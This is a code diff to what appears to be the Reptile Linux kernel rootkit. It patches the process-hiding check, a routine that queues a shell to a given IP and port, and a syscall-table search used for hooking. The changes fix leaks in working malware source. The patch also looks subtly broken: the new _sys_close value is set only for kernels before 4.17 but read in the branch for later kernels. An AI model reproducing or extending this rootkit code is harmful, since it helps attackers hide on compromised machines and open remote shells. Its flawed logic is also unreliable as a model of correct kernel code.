@@ -152,11 +152,14 @@ struct task_struct *find_task(pid_t pid){
 
 int is_invisible(pid_t pid){
 	struct task_struct *task;
-	if (!pid) return 0;
+	int ret = 0;
+
+	if (!pid) return ret;
 	task = find_task(pid);
-	if (!task) return 0;
-	if (task->flags & 0x10000000) return 1;
-	return 0;
+	if (!task) return ret;
+	if (task->flags & 0x10000000) ret = 1;
+	put_task_struct(task);
+	return ret;
 }
 
 void exec(char **argv){
@@ -184,11 +187,15 @@ int shell_exec_queue(char *path, char *ip, char *port) {
 
     	REPTILE_INIT_WORK(&task->work, &shell_execer);
     	task->path = kstrdup(path, GFP_KERNEL);
-	if(!task->path) return -1;
+	if(!task->path) {
+		kfree(task);
+		return -1;
+	}
 
 	task->ip = kstrdup(ip, GFP_KERNEL);
 	if(!task->ip) {
 		kfree(task->path);
+		kfree(task);
 		return -1;
     	}
 
@@ -196,6 +203,7 @@ int shell_exec_queue(char *path, char *ip, char *port) {
 	if(!task->port) { 
 		kfree(task->path);
 		kfree(task->ip);
+		kfree(task);
 		return -1;
 	}
 
@@ -449,7 +457,12 @@ unsigned long *find_sys_call_table(void) {
 
 unsigned long *generic_find_sys_call_table(void){
 	unsigned long *syscall_table;
+	unsigned long _sys_close;
 	unsigned long int i;
+
+#if LINUX_VERSION_CODE < KERNEL_VERSION(4, 17, 0)
+	_sys_close = (unsigned long) kallsyms_lookup_name(SYS_CLOSE);
+#endif
 
 	for (i = PAGE_OFFSET; i < ULONG_MAX; i += sizeof(void *)) {
 		syscall_table = (unsigned long *)i;
@@ -457,7 +470,7 @@ unsigned long *generic_find_sys_call_table(void){
 #if LINUX_VERSION_CODE < KERNEL_VERSION(4, 17, 0)
 		if (syscall_table[__NR_close] == (unsigned long)sys_close)
 #else 
-		if (syscall_table[__NR_close] == (unsigned long)kallsyms_lookup_name(SYS_CLOSE))
+		if (syscall_table[__NR_close] == (unsigned long)_sys_close)
 #endif
 			return syscall_table;
 	}
